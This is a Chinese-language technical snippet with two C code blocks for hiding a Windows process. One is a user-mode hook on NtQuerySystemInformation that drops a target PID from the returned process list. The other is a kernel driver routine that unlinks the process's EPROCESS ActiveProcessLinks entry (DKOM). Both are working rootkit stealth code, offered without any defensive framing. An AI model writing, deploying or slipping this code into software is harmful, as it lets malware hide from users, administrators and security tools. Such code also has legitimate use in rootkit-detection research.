**用户态 `NtQuerySystemInformation` hook（隐藏进程条目）**

```c
// hook SystemProcessInformation (0x05)，在返回链表里摘掉目标 PID 的节点
typedef NTSTATUS (NTAPI *pNtQSI)(ULONG, PVOID, ULONG, PULONG);

NTSTATUS NTAPI HookNtQSI(ULONG cls, PVOID buf, ULONG len, PULONG ret) {
    NTSTATUS st = RealNtQSI(cls, buf, len, ret);
    if (cls != 0x05 || !NT_SUCCESS(st)) return st;
    // 遍历 SYSTEM_PROCESS_INFORMATION 链表，NextEntryOffset 步进
    auto* cur = (SYSTEM_PROCESS_INFORMATION*)buf;
    auto* prev = cur;
    while (cur) {
        if ((DWORD)(ULONG_PTR)cur->UniqueProcessId == (DWORD)TARGET_PID) {
            if (cur->NextEntryOffset) {
                prev->NextEntryOffset += cur->NextEntryOffset;   // 摘链
            } else {
                prev->NextEntryOffset = 0;                        // 尾节点
            }
            return st;
        }
        prev = cur;
        if (!cur->NextEntryOffset) break;
        cur = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)cur + cur->NextEntryOffset);
    }
    return st;
}
```

**内核态 DKOM 摘 `ActiveProcessLinks`（驱动工程骨架，WDK）**

```c
// DriverEntry 里定位目标 EPROCESS 后摘双向链表
NTSTATUS HideProcess(HANDLE pid) {
    PEPROCESS ep = NULL;
    if (!NT_SUCCESS(PsLookupProcessByProcessId(pid, &ep))) return STATUS_NOT_FOUND;

    // ActiveProcessLinks 偏移需按系统版本逆向确认（Win10 19041 通常 0x448，未验证需实测）
    PLIST_ENTRY links = (PLIST_ENTRY)((BYTE*)ep + ACTIVE_PROCESS_LINKS_OFFSET);
    if (links->Flink && links->Blink) {
        links->Blink->Flink = links->Flink;   // 摘链前 dump 原值以便恢复
        links->Flink->Blink = links->Blink;
        links->Flink = links->Blink = links;  // 自闭环，避免 BSOD
    }
    ObDereferenceObject(ep);
    return STATUS_SUCCESS;
}
// 恢复：反向插回原 Flink/Blink（卸载驱动时必须执行，否则进程永久消失）
```

